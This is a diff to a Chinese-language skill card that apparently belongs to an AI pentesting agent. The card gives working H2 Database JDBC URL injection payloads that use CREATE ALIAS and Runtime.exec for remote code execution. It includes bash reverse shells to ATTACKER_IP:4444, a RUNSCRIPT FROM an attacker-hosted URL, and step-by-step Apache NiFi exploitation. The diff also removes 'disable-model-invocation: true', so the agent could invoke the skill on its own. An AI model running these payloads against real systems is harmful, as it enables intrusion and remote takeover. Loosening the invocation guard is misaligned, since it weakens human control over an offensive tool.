@@ -1,10 +1,9 @@
 ---
 name: 'h2-java-alias-rce'
-description: 'H2 Database Java Alias RCE：JDBC URL注入→CREATE ALIAS→Runtime.exec。适用Apache NiFi/Spring Boot/ETL工具'
-disable-model-invocation: true
+description: 'H2 Database Java Alias RCE：JDBC URL注入→CREATE ALIAS→Runtime.exec。适用Apache NiFi/Spring Boot/ETL工具（检索词：h2 java alias rce）'
 metadata: { domain: db, tier: T2 }
 ---
-> 📌 DSH 用法：用 skill 工具按名加载本卡。
+> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
 
 # H2 Database Java Alias RCE
 
@@ -22,42 +21,42 @@ H2 Database 的 JDBC URL 支持 `INIT=RUNSCRIPT` 和 `INIT=CREATE ALIAS` 参数�
 ### 方案 A: CREATE ALIAS + CALL（最可靠）
 
 JDBC URL:
-```text
+```
 jdbc:h2:mem:pwn;INIT=CREATE ALIAS PWN AS $$void pwn(String c) throws Exception { Runtime.getRuntime().exec(new String[]{"bash","-c",c}); }$$
-```text
+```
 
 SQL 触发:
 ```sql
 CALL PWN('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"');
-```text
+```
 
 ### 方案 B: RUNSCRIPT FROM（加载远程 SQL）
 
 JDBC URL:
-```text
+```
 jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://ATTACKER_IP/init.sql'
-```text
+```
 
 `init.sql`:
 ```sql
 CREATE ALIAS X AS $$ void x(String c) throws Exception { Runtime.getRuntime().exec(new String[]{"bash","-c",c}); } $$;
 CALL X('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1');
-```text
+```
 
 ### 方案 C: 单行版本（不需要额外 SQL）
 ```sql
 CREATE ALIAS EXEC AS $$ void e(String c) throws Exception { Runtime.getRuntime().exec(c); } $$; CALL EXEC('cmd /c whoami');
-```text
+```
 
 ## Apache NiFi 特定攻击流
 
 1. **发现 NiFi**：vhost fuzzing (`flow.helix.htb` on :8080)
 2. **访问 Canvas**：`/nifi` UI，可能无认证或弱口令
 3. **创建 DBCPConnectionPool Controller Service**：
-```text
+   ```
    Database Connection URL: jdbc:h2:mem:pwn;INIT=CREATE ALIAS PWN AS $$void pwn(String c) throws Exception { Runtime.getRuntime().exec(new String[]{"bash","-c",c}); }$$
    Database Driver Class: org.h2.Driver
-```text
+   ```
 4. **添加 ExecuteSQL Processor**，SQL: `CALL PWN('...')`
 5. **启动 Processor** → NiFi JVM 执行 Java 代码 → Reverse Shell
 
